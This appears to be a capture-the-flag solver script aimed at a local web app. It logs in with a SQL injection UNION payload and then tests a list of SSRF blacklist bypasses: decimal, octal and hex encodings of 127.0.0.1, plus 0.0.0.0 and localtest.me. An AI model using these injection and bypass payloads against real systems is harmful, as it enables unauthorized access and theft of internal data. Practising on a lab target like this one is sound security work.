import requests

def test_url(url):
    try:
        print(f"Testing {url}...")
        response = requests.get(url, timeout=2)
        if "FLAG{" in response.text:
            print(f"Success (Flag Found): {response.status_code}")
        elif "The scroll cannot look at itself" in response.text:
            print(f"Blocked (Blacklist): {response.status_code}")
        else:
            print(f"Other Response: {response.status_code}")
    except Exception as e:
        print(f"Failed: {e}")

# Start a simple server to test against if needed, or just rely on the fact that 5002 is running
# The app is running on 5002 from previous step.

# Start a simple server to test against if needed, or just rely on the fact that 5002 is running
# The app is running on 5002 from previous step.

sanctum_url = "http://localhost:5002/sanctum"
login_url = "http://localhost:5002/login"

def test_payload(payload):
    session = requests.Session()
    # Login first (using the UNION bypass we implemented)
    login_data = {
        "username": "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' --",
        "password": "anything"
    }
    session.post(login_url, data=login_data)
    
    target_url = f"http://{payload}:5002/master_seal"
    print(f"Testing payload: {payload} -> {target_url}")
    
    try:
        data = {"url": target_url}
        response = session.post(sanctum_url, data=data)
        
        if "FLAG{" in response.text:
            print(f"Success (Bypass Worked): {payload}")
        elif "The scroll cannot look at itself" in response.text:
            print(f"Blocked (Blacklist): {payload}")
        else:
            print(f"Failed (Other): {response.status_code}")
            # print(response.text[:200])
            
    except Exception as e:
        print(f"Error: {e}")

payloads = [
    "127.0.0.1",
    "2130706433", # Decimal
    "0177.0.0.1", # Octal
    "0x7f.0.0.1", # Hex
    "0x7f000001", # Hex integer
    "0.0.0.0",
    "localtest.me" # DNS rebinding
]

for p in payloads:
    test_payload(p)
